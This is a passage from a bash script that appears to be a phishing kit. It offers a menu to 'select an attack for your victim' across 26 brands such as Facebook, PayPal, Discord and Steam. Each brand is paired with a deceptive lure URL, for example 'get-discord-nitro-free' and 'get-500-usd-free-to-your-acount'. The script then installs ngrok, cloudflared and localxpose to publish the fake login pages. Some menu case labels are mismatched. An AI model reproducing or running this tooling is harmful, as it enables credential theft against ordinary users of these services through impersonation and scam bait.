		${RED}Select An Attack For Your Victim:

		${WHITE}| ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Airbnb	${WHITE}| ${BRIGHT_BLACK}11. ${BRIGHT_CYAN}Tiktok	${WHITE}| ${BRIGHT_BLACK}21. ${BRIGHT_CYAN}Roblox
		${WHITE}| ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Adobe	${WHITE}| ${BRIGHT_BLACK}12. ${BRIGHT_CYAN}Snapchat	${WHITE}| ${BRIGHT_BLACK}22. ${BRIGHT_CYAN}Steam	
		${WHITE}| ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Facebook	${WHITE}| ${BRIGHT_BLACK}13. ${BRIGHT_CYAN}Spotify	${WHITE}| ${BRIGHT_BLACK}23. ${BRIGHT_CYAN}Playstation
		${WHITE}| ${BRIGHT_BLACK}04. ${BRIGHT_CYAN}Instagram	${WHITE}| ${BRIGHT_BLACK}14. ${BRIGHT_CYAN}Github	${WHITE}| ${BRIGHT_BLACK}24. ${BRIGHT_CYAN}Xbox
		${WHITE}| ${BRIGHT_BLACK}05. ${BRIGHT_CYAN}Google	${WHITE}| ${BRIGHT_BLACK}15. ${BRIGHT_CYAN}Shopify	${WHITE}| ${BRIGHT_BLACK}25. ${BRIGHT_CYAN}Verizon
		${WHITE}| ${BRIGHT_BLACK}06. ${BRIGHT_CYAN}Bitcoin	${WHITE}| ${BRIGHT_BLACK}16. ${BRIGHT_CYAN}Ebay	| ${WHITE}26. ${BRIGHT_CYAN}Wifi
		${WHITE}| ${BRIGHT_BLACK}07. ${BRIGHT_CYAN}Crypto	${WHITE}| ${BRIGHT_BLACK}17. ${BRIGHT_CYAN}Pinterest	${WHITE}|	
		${WHITE}| ${BRIGHT_BLACK}08. ${BRIGHT_CYAN}Microsoft	${WHITE}| ${BRIGHT_BLACK}18. ${BRIGHT_CYAN}Discord	${WHITE}| 
		${WHITE}| ${BRIGHT_BLACK}09. ${BRIGHT_CYAN}Netflix	${WHITE}| ${BRIGHT_BLACK}19. ${BRIGHT_CYAN}Reddit	${WHITE}| 
		${WHITE}| ${BRIGHT_BLACK}10. ${BRIGHT_CYAN}Paypal	${WHITE}| ${BRIGHT_BLACK}20. ${BRIGHT_CYAN}Messenger	${WHITE}| 

		${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About         ${BRIGHT_BLACK}0. ${BRIGHT_CYAN}Exit
	EOF

	echo
	read -p "${MAGENTA}Select an option:"

	case $REPLY in 
		1 | 01)
			website="airbnb"
			mask=''
			tunnel_menu;;
		2 | 01)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		3 | 02)
			site_facebook;;
		4 | 03)
			site_instagram;;
		5 | 04)
			site_gmail;;
		6 | 05)
			website="bitcoin"
			tunnel_menu;;
		7 | 06)
			website="cryptocoinsniper"
			mask='https://get-free-cryto'
			tunnel_menu;;
		8 | 07)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		9 | 08)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		10)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		11)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		12)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		13)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		14)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		15)
			website="shopify"
			tunnel_menu;;
		16)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		17)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		18)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="messenger"
			tunnel_menu;;
		21)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		22)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		23)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		24)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		25)
			website="verizon"
			mask='https://get-unlimited-data'
			tunnel_menu;;
		26)
			website="wifi"
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
check_status
install_ngrok
install_cloudflared
install_localxpose
main_menu
